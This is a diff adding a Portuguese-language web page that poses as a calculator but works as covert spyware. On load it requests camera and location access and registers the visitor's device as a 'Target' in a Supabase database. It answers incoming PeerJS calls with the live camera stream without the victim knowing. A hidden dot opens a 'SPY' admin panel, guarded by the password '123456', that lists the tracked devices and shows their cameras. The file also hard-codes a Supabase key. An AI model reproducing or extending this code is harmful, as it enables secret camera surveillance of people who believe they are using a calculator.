@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Calc // SECURE</title>
+    <!-- PeerJS para conexão real entre dispositivos -->
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <!-- Supabase JS Client -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        :root {
+            --bg-color: #000;
+            --text-color: #fff;
+            --btn-bg: #333;
+            --btn-orange: #ff9f0a;
+            --btn-gray: #a5a5a5;
+            --admin-color: #ff0055;
+            --font-calc: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            font-family: var(--font-calc);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
+            user-select: none;
+        }
+
+        #perm-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.98);
+            z-index: 5000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+
+        .perm-box {
+            border: 1px solid #555;
+            padding: 20px;
+            background: #111;
+            max-width: 300px;
+            border-radius: 10px;
+        }
+
+        .spinner {
+            border: 3px solid #333;
+            border-top: 3px solid var(--btn-orange);
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .calc-container {
+            width: 100%;
+            max-width: 400px;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+            box-sizing: border-box;
+            position: relative;
+        }
+
+        #display-screen {
+            flex: 1;
+            display: flex;
+            align-items: flex-end;
+            justify-content: flex-end;
+            font-size: 4rem;
+            padding: 20px;
+            word-break: break-all;
+            cursor: pointer;
+            position: relative;
+            font-weight: 300;
+        }
+
+        #sec-btn {
+            position: absolute;
+            bottom: 15px;
+            right: 15px;
+            width: 10px;
+            height: 10px;
+            background-color: rgba(255,255,255,0.1);
+            border-radius: 50%;
+            cursor: pointer;
+            z-index: 100;
+            transition: background 0.3s;
+        }
+        #sec-btn:hover { background-color: rgba(255,255,255,0.5); }
+
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+            padding-bottom: 20px;
+        }
+
+        button.key {
+            background-color: var(--btn-bg);
+            border: none;
+            border-radius: 50%;
+            width: 70px;
+            height: 70px;
+            font-size: 1.5rem;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: filter 0.1s;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        button.key:active { filter: brightness(1.5); }
+        button.key.zero { grid-column: span 2; width: 100%; border-radius: 35px; justify-content: flex-start; padding-left: 28px; }
+        button.key.orange { background-color: var(--btn-orange); }
+        button.key.gray { background-color: var(--btn-gray); color: black; }
+
+        #spy-panel {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #000;
+            z-index: 4000;
+            flex-direction: column;
+            padding: 10px;
+            box-sizing: border-box;
+            overflow-y: auto;
+        }
+
+        .spy-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px;
+            border-bottom: 1px solid #333;
+            margin-bottom: 10px;
+        }
+
+        .tab-menu {
+            display: flex;
+            justify-content: space-around;
+            margin-bottom: 10px;
+        }
+
+        .tab-btn {
+            background: none;
+            border: none;
+            color: #666;
+            font-size: 0.9rem;
+            padding: 10px;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+        }
+
+        .tab-btn.active {
+            color: var(--btn-orange);
+            border-bottom: 2px solid var(--btn-orange);
+        }
+
+        .content-section { display: none; height: calc(100% - 120px); overflow-y: auto; }
+        .content-section.active { display: block; }
+
+        .cam-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 10px;
+            height: 100%;
+        }
+
+        .cam-card {
+            border: 1px solid #333;
+            position: relative;
+            background: #111;
+            aspect-ratio: 4/3;
+            overflow: hidden;
+        }
+
+        video { 
+            width: 100%; 
+            height: 100%; 
+            object-fit: cover; 
+            transform: scaleX(-1);
+            background: #000;
+        }
+
+        .cam-label {
+            position: absolute;
+            top: 5px; left: 5px;
+            background: rgba(0,0,0,0.6);
+            padding: 2px 5px;
+            font-size: 0.7rem;
+            color: #fff;
+            border-radius: 4px;
+        }
+
+        .device-list { list-style: none; padding: 0; margin: 0; }
+        .device-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 15px;
+            border-bottom: 1px solid #222;
+            align-items: center;
+            cursor: pointer;
+        }
+        .device-item:hover { background: #111; }
+        .device-info h4 { margin: 0; font-size: 1rem; color: #fff; }
+        .device-info p { margin: 0; font-size: 0.8rem; color: #666; }
+        .status-dot { width: 8px; height: 8px; background: #0f0; border-radius: 50%; box-shadow: 0 0 5px #0f0; }
+
+        .photo-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 2px;
+        }
+        .photo-thumb {
+            width: 100%;
+            aspect-ratio: 1;
+            object-fit: cover;
+            background: #222;
+            cursor: pointer;
+        }
+
+        .admin-input-group {
+            padding: 20px;
+            text-align: center;
+        }
+        #admin-pass {
+            background: #222;
+            border: 1px solid #444;
+            color: var(--admin-color);
+            font-size: 2rem;
+            letter-spacing: 10px;
+            text-align: center;
+            width: 80%;
+            padding: 10px;
+            margin-bottom: 10px;
+            outline: none;
+        }
+        .login-btn {
+            background: var(--btn-orange);
+            border: none;
+            padding: 10px 30px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .close-spy {
+            position: absolute;
+            top: 10px; right: 10px;
+            background: #333;
+            border: none;
+            color: white;
+            width: 30px; height: 30px;
+            border-radius: 50%;
+            z-index: 10;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="perm-overlay">
+        <div class="perm-box">
+            <h3 style="color:white; margin-bottom: 10px;">CALC APP</h3>
+            <p style="color:#aaa; font-size: 0.9rem;">Solicitando permissões...</p>
+            <div id="perm-status">
+                <div class="spinner"></div>
+                <p id="perm-text">Verificando dispositivo...</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="calc-container">
+        <div id="display-screen">
+            0
+            <div id="sec-btn"></div>
+        </div>
+        
+        <div class="keypad">
+            <button class="key gray" onclick="clearDisplay()">AC</button>
+            <button class="key gray" onclick="toggleSign()">+/-</button>
+            <button class="key gray" onclick="percent()">%</button>
+            <button class="key orange" onclick="appendOp('/')">÷</button>
+            
+            <button class="key" onclick="appendNum('7')">7</button>
+            <button class="key" onclick="appendNum('8')">8</button>
+            <button class="key" onclick="appendNum('9')">9</button>
+            <button class="key orange" onclick="appendOp('*')">×</button>
+            
+            <button class="key" onclick="appendNum('4')">4</button>
+            <button class="key" onclick="appendNum('5')">5</button>
+            <button class="key" onclick="appendNum('6')">6</button>
+            <button class="key orange" onclick="appendOp('-')">-</button>
+            
+            <button class="key" onclick="appendNum('1')">1</button>
+            <button class="key" onclick="appendNum('2')">2</button>
+            <button class="key" onclick="appendNum('3')">3</button>
+            <button class="key orange" onclick="appendOp('+')">+</button>
+            
+            <button class="key zero" onclick="appendNum('0')">0</button>
+            <button class="key" onclick="appendNum('.')">.</button>
+            <button class="key orange" onclick="calculate()">=</button>
+        </div>
+        
+        <input type="file" id="real-file-input" multiple accept="image/*" style="display:none" onchange="handleFiles(this.files)">
+        <div id="real-file-trigger" onclick="document.getElementById('real-file-input').click()" style="position:absolute; bottom:10px; left:10px; width:10px; height:10px; cursor:pointer;"></div>
+    </div>
+
+    <div id="spy-panel">
+        <button class="close-spy" onclick="closeSpyPanel()">✕</button>
+        
+        <div class="spy-header">
+            <span style="color:var(--admin-color); font-weight:bold; letter-spacing: 1px;">SECURE // ADMIN</span>
+            <span style="font-size:0.7rem; color:#666;" id="clock-display">00:00</span>
+        </div>
+
+        <div class="tab-menu">
+            <button class="tab-btn active" onclick="switchTab('cams')">CÂMERAS</button>
+            <button class="tab-btn" onclick="switchTab('devices')">DISPOSITIVOS</button>
+            <button class="tab-btn" onclick="switchTab('photos')">FOTOS</button>
+        </div>
+
+        <div id="tab-cams" class="content-section active">
+            <div class="cam-grid">
+                <div class="cam-card">
+                    <video id="local-cam" autoplay muted playsinline></video>
+                    <div class="cam-label">LOCAL (YOU)</div>
+                </div>
+                <div class="cam-card">
+                    <video id="remote-cam" autoplay muted playsinline></video>
+                    <div class="cam-label" id="remote-label">REMOTE</div>
+                </div>
+            </div>
+        </div>
+
+        <div id="tab-devices" class="content-section">
+            <ul class="device-list" id="device-list-container"></ul>
+        </div>
+
+        <div id="tab-photos" class="content-section">
+            <div class="photo-grid" id="photo-grid">
+                <div style="padding:20px; color:#555; grid-column: span 3; text-align:center;">Aguardando uploads...</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // --- CONFIGURAÇÃO SUPABASE ---
+        const SUPABASE_URL = 'https://rijqdvnoalmvfejbdpzr.supabase.co';
+        const SUPABASE_KEY = 'sb_publishable_H1qFAvaokGPPnMlJzVZvnA_pFv4_C06';
+        const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+        // --- CALCULADORA ---
+        let currentInput = '0';
+        let previousInput = '';
+        let operator = null;
+
+        function updateDisplay() {
+            const screen = document.getElementById('display-screen');
+            if(screen.firstChild.nodeType === 3) {
+                screen.firstChild.nodeValue = currentInput;
+            } else {
+                screen.insertBefore(document.createTextNode(currentInput), screen.firstChild.nextSibling);
+            }
+        }
+
+        function appendNum(num) {
+            if (currentInput === '0' || currentInput === 'Error') currentInput = '';
+            currentInput += num;
+            updateDisplay();
+        }
+
+        function appendOp(op) {
+            if (operator !== null) calculate();
+            previousInput = currentInput;
+            operator = op;
+            currentInput = '0';
+        }
+
+        function calculate() {
+            if (!operator || !previousInput) return;
+            let result;
+            const prev = parseFloat(previousInput);
+            const curr = parseFloat(currentInput);
+
+            switch(operator) {
+                case '+': result = prev + curr; break;
+                case '-': result = prev - curr; break;
+                case '*': result = prev * curr; break;
+                case '/': result = prev / curr; break;
+            }
+            
+            currentInput = String(parseFloat(result.toFixed(4)));
+            operator = null;
+            previousInput = '';
+            updateDisplay();
+        }
+
+        function clearDisplay() {
+            currentInput = '0';
+            previousInput = '';
+            operator = null;
+            updateDisplay();
+        }
+
+        function toggleSign() {
+            currentInput = String(parseFloat(currentInput) * -1);
+            updateDisplay();
+        }
+
+        function percent() {
+            currentInput = String(parseFloat(currentInput) / 100);
+            updateDisplay();
+        }
+
+        // --- PERMISSÕES E INICIALIZAÇÃO ---
+        const permOverlay = document.getElementById('perm-overlay');
+        const permText = document.getElementById('perm-text');
+        let peer;
+        let myId;
+
+        async function requestPermissions() {
+            try {
+                permText.innerText = "Acessando Câmera...";
+                await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                
+                permText.innerText = "Localizando dispositivo...";
+                await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 3000});
+                });
+
+                permText.innerText = "Acesso Concedido.";
+                permText.style.color = "#0f0";
+                setTimeout(() => {
+                    permOverlay.style.opacity = '0';
+                    setTimeout(() => {
+                        permOverlay.style.display = 'none';
+                        startAppBackend();
+                    }, 500);
+                }, 500);
+
+            } catch (err) {
+                permText.innerText = "Modo Limitado Ativo.";
+                setTimeout(() => {
+                    permOverlay.style.display = 'none';
+                    startAppBackend();
+                }, 1000);
+            }
+        }
+
+        // --- BACKEND WEBRTC + SUPABASE REALTIME ---
+        function startAppBackend() {
+            updateClock();
+            setInterval(updateClock, 1000);
+            
+            peer = new Peer();
+            
+            peer.on('open', async (id) => {
+                myId = id;
+                // Registra o dispositivo no Supabase Online
+                await supabaseClient.from('devices').upsert({
+                    id: id,
+                    name: 'Target-' + id.substring(0, 4),
+                    status: 'Online',
+                    last_seen: new Date()
+                });
+                fetchDevicesFromSupabase();
+                fetchPhotosFromSupabase();
+            });
+
+            peer.on('call', (call) => {
+                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                    .then((stream) => {
+                        call.answer(stream);
+                    })
+                    .catch(err => console.error(err));
+                
+                call.on('stream', (remoteStream) => {
+                    showRemoteVideo(remoteStream);
+                });
+            });
+
+            // Inscrever-se em mudanças em tempo real no Supabase
+            supabaseClient
+                .channel('realtime-devices')
+                .on('postgres_changes', { event: '*', schema: 'public', table: 'devices' }, () => {
+                    fetchDevicesFromSupabase();
+                })
+                .subscribe();
+
+            supabaseClient
+                .channel('realtime-photos')
+                .on('postgres_changes', { event: '*', schema: 'public', table: 'photos' }, () => {
+                    fetchPhotosFromSupabase();
+                })
+                .subscribe();
+
+            initCameras();
+        }
+
+        async function initCameras() {
+            const localVideo = document.getElementById('local-cam');
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                localVideo.srcObject = stream;
+            } catch (e) {
+                console.log("Camera error:", e);
+            }
+        }
+
+        function showRemoteVideo(stream) {
+            const remoteVideo = document.getElementById('remote-cam');
+            remoteVideo.srcObject = stream;
+            switchTab('cams');
+        }
+
+        async function fetchDevicesFromSupabase() {
+            const { data, error } = await supabaseClient.from('devices').select('*');
+            if (error) return;
+
+            const list = document.getElementById('device-list-container');
+            if (!list) return;
+            list.innerHTML = '';
+
+            data.forEach(dev => {
+                const li = document.createElement('li');
+                li.className = 'device-item';
+                li.innerHTML = `
+                    <div class="device-info">
+                        <h4>${dev.name} ${dev.id === myId ? '(YOU)' : ''}</h4>
+                        <p>ID: ${dev.id.substring(0, 6)}...</p>
+                    </div>
+                    <div class="status-dot" style="background:${dev.status === 'Offline' ? '#666' : '#0f0'}"></div>
+                `;
+                if (dev.id !== myId) {
+                    li.onclick = () => connectToDevice(dev.id);
+                }
+                list.appendChild(li);
+            });
+        }
+
+        function connectToDevice(targetId) {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                .then((myStream) => {
+                    const call = peer.call(targetId, myStream);
+                    call.on('stream', (remoteStream) => {
+                        showRemoteVideo(remoteStream);
+                    });
+                })
+                .catch(() => alert("Erro ao conectar com o alvo."));
+        }
+
+        async function fetchPhotosFromSupabase() {
+            const { data, error } = await supabaseClient.from('photos').select('*').order('created_at', { ascending: false });
+            const grid = document.getElementById('photo-grid');
+            if (!grid || error || !data || data.length === 0) return;
+
+            grid.innerHTML = '';
+            data.forEach(photo => {
+                const img = document.createElement('img');
+                img.src = photo.image_url;
+                img.className = 'photo-thumb';
+                grid.appendChild(img);
+            });
+        }
+
+        async function handleFiles(files) {
+            Array.from(files).forEach(file => {
+                const reader = new FileReader();
+                reader.onload = async (e) => {
+                    const base64Image = e.target.result;
+                    // Salva a foto no Supabase em tempo real
+                    await supabaseClient.from('photos').insert({
+                        device_id: myId,
+                        image_url: base64Image
+                    });
+                    fetchPhotosFromSupabase();
+                };
+                reader.readAsDataURL(file);
+            });
+        }
+
+        function updateClock() {
+            const now = new Date();
+            const clockEl = document.getElementById('clock-display');
+            if(clockEl) clockEl.innerText = now.toLocaleTimeString('pt-BR', {hour: '2-digit', minute:'2-digit'});
+        }
+
+        function switchTab(tabName) {
+            document.querySelectorAll('.content-section').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
+            
+            const targetSec = document.getElementById(`tab-${tabName}`);
+            if(targetSec) targetSec.classList.add('active');
+            
+            const btnIndex = ['cams', 'devices', 'photos'].indexOf(tabName);
+            const btn = document.querySelectorAll('.tab-btn')[btnIndex];
+            if(btn) btn.classList.add('active');
+        }
+
+        // --- PAINEL SECRETO / SENHA ---
+        const secBtn = document.getElementById('sec-btn');
+        const spyPanel = document.getElementById('spy-panel');
+
+        secBtn.addEventListener('click', () => {
+            spyPanel.style.display = 'flex';
+            spyPanel.innerHTML = `
+                <button class="close-spy" onclick="closeSpyPanel()">✕</button>
+                <div class="admin-input-group">
+                    <h3 style="color:var(--admin-color)">ADMIN ACCESS</h3>
+                    <input type="password" id="admin-pass" maxlength="6" placeholder="••••••" inputmode="numeric">
+                    <br>
+                    <button class="login-btn" onclick="checkPassword()">ENTER</button>
+                    <p id="error-msg" style="color:red; font-size:0.8rem; height:1rem;"></p>
+                </div>
+            `;
+            const passInput = document.getElementById('admin-pass');
+            if(passInput) {
+                passInput.focus();
+                passInput.addEventListener('keypress', (e) => {
+                    if(e.key === 'Enter') checkPassword();
+                });
+            }
+        });
+
+        function checkPassword() {
+            const pass = document.getElementById('admin-pass').value;
+            if (pass === "123456") { 
+                loadFullPanel();
+            } else {
+                const err = document.getElementById('error-msg');
+                if(err) err.innerText = "ACESSO NEGADO";
+            }
+        }
+
+        function loadFullPanel() {
+            spyPanel.innerHTML = `
+                <button class="close-spy" onclick="closeSpyPanel()">✕</button>
+                <div class="spy-header">
+                    <span style="color:var(--admin-color); font-weight:bold; letter-spacing: 1px;">SECURE // ADMIN</span>
+                    <span style="font-size:0.7rem; color:#666;" id="clock-display">00:00</span>
+                </div>
+                <div class="tab-menu">
+                    <button class="tab-btn active" onclick="switchTab('cams')">CÂMERAS</button>
+                    <button class="tab-btn" onclick="switchTab('devices')">DISPOSITIVOS</button>
+                    <button class="tab-btn" onclick="switchTab('photos')">FOTOS</button>
+                </div>
+                <div id="tab-cams" class="content-section active">
+                    <div class="cam-grid">
+                        <div class="cam-card"><video id="local-cam" autoplay muted playsinline></video><div class="cam-label">LOCAL</div></div>
+                        <div class="cam-card"><video id="remote-cam" autoplay muted playsinline></video><div class="cam-label" id="remote-label">REMOTE</div></div>
+                    </div>
+                </div>
+                <div id="tab-devices" class="content-section">
+                    <ul class="device-list" id="device-list-container"></ul>
+                </div>
+                <div id="tab-photos" class="content-section">
+                    <div class="photo-grid" id="photo-grid"></div>
+                </div>
+            `;
+            
+            updateClock();
+            setInterval(updateClock, 1000);
+            
+            initCameras();
+            fetchDevicesFromSupabase();
+            fetchPhotosFromSupabase();
+        }
+
+        function closeSpyPanel() {
+            spyPanel.style.display = 'none';
+        }
+
+        window.onload = requestPermissions;
+    </script>
+</body>
+</html>
